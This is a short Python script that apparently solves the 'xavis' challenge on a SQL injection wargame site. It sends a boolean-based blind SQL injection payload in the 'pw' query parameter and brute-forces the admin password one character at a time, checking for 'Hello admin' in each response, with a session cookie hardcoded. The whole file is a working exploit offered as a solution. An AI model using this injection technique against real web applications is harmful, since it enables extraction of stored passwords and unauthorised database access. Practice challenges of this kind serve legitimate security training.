import requests
import string

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw="
cookies = {'PHPSESSID':'41aur2saes3i6013o5p8mk9o9p'}
for j in range(1,9):
    for i in range(0x1,0x10000):
        url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=1%27%20or%20ord(substr(pw,"+str(j)+",1))="+str(i)+"--%20-"
        res = requests.get(url,cookies=cookies)
        res = res.text
        if "Hello admin" in res:
            print("%d : %c" % (j,i))
            break
        else: pass